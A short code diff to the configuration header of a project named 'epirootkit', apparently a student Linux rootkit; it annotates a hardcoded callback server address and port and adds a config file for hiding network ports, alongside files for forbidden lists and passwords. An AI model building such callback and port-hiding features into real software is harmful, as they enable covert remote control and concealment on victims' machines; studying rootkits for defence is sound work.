@@ -22,7 +22,7 @@
 	} while (0)
 
 // PARAMETERS MACROS
-#define SERVER_IP "192.168.100.1"
+#define SERVER_IP "192.168.100.1" // TO ADAPT
 #define SERVER_PORT 4242
 #define CONNEXION_MESSAGE "epirootkit: connexion established\n"
 
@@ -57,6 +57,8 @@
 #define FORBID_CFG_FILE "forbid_list.cfg"
 #define ALTERATE_CFG_FILE "alterate_list.cfg"
 #define PASSWD_CFG_FILE "passwd.cfg"
+#define HIDE_PORT_CFG_FILE "hide_ports.cfg"
+
 
 
 // OTHER MACROS
